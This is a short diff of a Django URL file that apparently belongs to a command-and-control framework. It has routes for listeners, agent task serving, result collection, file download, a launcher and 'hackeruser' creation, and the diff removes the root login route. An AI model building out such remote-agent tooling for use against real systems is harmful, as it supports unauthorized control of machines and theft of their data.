@@ -7,7 +7,6 @@ from . import views
 #/sc/ddasdx
 #/sc/
 urlpatterns = [
-    path('', views.LoginPage , name='blog-login'),
     path('homePage/' , views.HomePage  , name='blog-home'),
     path('listeners/' , views.ListenersPage  , name='blog-listener'),
     path('directorylist/' , views.dirlist  , name='blog-directorylist'),
@@ -19,6 +18,8 @@ urlpatterns = [
     path('download/<eth>/',views.Listener.agent.sendFile,name='blog-sendFile'),
     path('tasks/<name>/',views.Listener.agent.serveTasks,name='blog-serveTasks'),
     path('results/<name>', views.Listener.agent.receiveResults , name='blog-result'),
+    path('hackeruser/createuser/', views.HackerUser , name='blog-createuser'),
+    path('launcher/', views.Launcher , name='blog-Launcher'),
 
     
     # path('results/{}'.format(Listener.name) , views.receiveResults , name='blog-result'),
